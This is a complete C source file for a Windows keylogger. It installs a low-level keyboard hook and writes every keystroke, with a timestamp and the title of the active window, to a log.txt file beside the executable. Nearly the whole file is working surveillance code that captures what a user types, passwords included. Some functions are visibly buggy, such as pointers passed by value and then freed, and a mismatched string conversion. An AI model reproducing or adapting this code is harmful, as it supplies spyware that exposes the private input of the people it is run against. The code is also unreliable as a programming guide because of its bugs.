#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

HHOOK kbd_hook = NULL;
bool capsLock, shift;
FILE *f;
char title[256];
char timestamp[256];
HWND hwnd;
SYSTEMTIME st;
char keyboard_state[256];
wchar_t buf[2];
char *key_pressed;
char  output[256];

BOOL shift_pressed = FALSE;


void    getKeysState(bool *capsLock, bool *shift) {
    /*
        // Getting the state of the keys in order to know if they are pressed or not.    
    */
    *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
}

void    handleSpecial(int vkCode, char *key_pressed) {
    /*
        // Attributing a value to all the "special" keys in order to make them readable for the user.

        // vkCode: The virtual key code of the key pressed.

        // -----------------------------
        // In this function, we also check if shift is pressed or not in order to be able to write the key pressed in the right case. 
    */
    if (key_pressed)
        free(key_pressed);
    if (vkCode == VK_SPACE)
        key_pressed = strdup("[SPACE]");
    else if (vkCode == VK_RETURN)
        key_pressed = strdup("[ENTER]");
    else if (vkCode == VK_BACK)
        key_pressed = strdup("[BACKSPACE]");
    else if (vkCode == VK_TAB)
        key_pressed = strdup("[TAB]");
    else if (vkCode == VK_ESCAPE)
        key_pressed = strdup("[ESC]");
    else if (vkCode == VK_CAPITAL)
        key_pressed = strdup("[CAPSLOCK]");
    else if (vkCode == VK_SHIFT)
        key_pressed = strdup("[SHIFT]");
    else if (vkCode == VK_LCONTROL)
        key_pressed = strdup("[LEFT CTRL]");
    else if (vkCode == VK_RCONTROL)
        key_pressed = strdup("[RIGHT CTRL]");
    else if (vkCode == VK_LSHIFT){
        shift_pressed = true;
        key_pressed = strdup("[LEFT SHIFT]");
    }
    else if (vkCode == VK_RSHIFT){
        shift_pressed = true;
        key_pressed = strdup("[RIGHT SHIFT]");
    }
}

int    specialCombinaison(int vkCode, char *key_pressed) {
    /*
        // In this function, we handle all the special combinaisons for a QWERTY layout.
    */
    if (shift_pressed) {
        switch (vkCode) {
            case VK_OEM_PLUS:
                key_pressed = strcpy(key_pressed, "+");
                return 1;
            case VK_OEM_MINUS:
                key_pressed = strcpy(key_pressed, "_");
                return 1;
            case 0x39:
                key_pressed = strcpy(key_pressed, "(");
                return 1;
            case 0x38:
                key_pressed = strcpy(key_pressed, "[");
                return 1;
            case 0x37:
                key_pressed = strcpy(key_pressed, "*");
                return 1;
            case 0x36:
                key_pressed = strcpy(key_pressed, "^");
                return 1;
            case 0x35:
                key_pressed = strcpy(key_pressed, "%");
                return 1;
            case 0x34:
                key_pressed = strcpy(key_pressed, "$");
                return 1;
            case 0x33:
                key_pressed = strcpy(key_pressed, "#");
                return 1;
            case 0x32:
                key_pressed = strcpy(key_pressed, "@");
                return 1;
            case 0x31:
                key_pressed = strcpy(key_pressed, "!");
                return 1;
            case 0x30:
                key_pressed = strcpy(key_pressed, ")");
                return 1;
            case VK_OEM_COMMA: // ,
                key_pressed = strcpy(key_pressed, "<");
                return 1;
            case VK_OEM_PERIOD: // .
                key_pressed = strcpy(key_pressed, ">");
                return 1;
            case VK_OEM_1: // ; :
                key_pressed = strcpy(key_pressed, ":");
                return 1;
            case VK_OEM_2: // /
                key_pressed = strcpy(key_pressed, "?");
                return 1;
            case VK_OEM_4: // [
                key_pressed = strcpy(key_pressed, "{");
                return 1;
            case VK_OEM_5: // \ |
                key_pressed = strcpy(key_pressed, "|");
                return 1;
            case VK_OEM_6: // ]
                key_pressed = strcpy(key_pressed, "}");
                return 1;
            case VK_OEM_7: // ' "
                key_pressed = strcpy(key_pressed, "\"");
                return 1;
        }
    }
    return 0;
}


LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
    /*
        // The hook procedure that will be called every time a key is pressed.

        // The hook procedure is called with the following parameters:
        // code: Specifies whether the hook procedure must process the message.
        // wparam: Specifies whether the key is being pressed or released.
        // lparam: Pointer to a KBDLLHOOKSTRUCT structure.

        // The hook procedure will write on a logfile the current timestamp, the window title and the key pressed.
    */
    if (code < 0)
        return CallNextHookEx(kbd_hook, code, wparam, lparam);

    KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;

    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL) {
        if (info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) {
            shift_pressed = false;
        }
        return 0;
    }


    if (!(key_pressed = malloc(sizeof(char) * 4)))
        return 0;
    if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
        getKeysState(&capsLock, &shift);
    GetKeyboardState(keyboard_state);

    int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
    if (buf_len >= 0)
    {
        buf[buf_len] = 0;
        WideCharToMultiByte(CP_UTF8, 0, buf, -1, key_pressed, 4, NULL, NULL);
        if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_LCONTROL
            || info->vkCode == VK_RCONTROL || info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT 
            || info->vkCode == VK_CAPITAL)
            handleSpecial(info->vkCode, key_pressed);


        if ((capsLock && !shift_pressed) || (!capsLock && shift_pressed))
            if (!specialCombinaison(info->vkCode, key_pressed))
                key_pressed[0] = toupper(key_pressed[0]);
        else if ((!capsLock && !shift_pressed) || (capsLock && shift_pressed))
            if (!specialCombinaison(info->vkCode, key_pressed))
                key_pressed[0] = tolower(key_pressed[0]);
        
        GetLocalTime(&st);

        sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        hwnd = GetForegroundWindow();
        GetWindowTextA(hwnd, title, 256);

        WideCharToMultiByte(CP_UTF8, 0, title, -1, title, 256, NULL, NULL);
        sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
        fwrite(output, 1, strlen(output), f);
        fflush(f);
        free(key_pressed);
    }

    return 0;
}

int main(void) {
    char path[1024];
    GetModuleFileNameA(NULL, path, 1024);
    char *last_slash = strrchr(path, '\\');
    if (last_slash)
        *last_slash = '\0';

    HINSTANCE hInstance = GetModuleHandleW(NULL);
    f = fopen(strcat(path, "\\log.txt"), "w");
    
    
    getKeysState(&capsLock, &shift);
    kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
    if (!kbd_hook)
        return (printf("hook installation failed: %d\n", GetLastError(), 1));

    MSG msg;
    GetMessageW(&msg, NULL, 0, 0);
}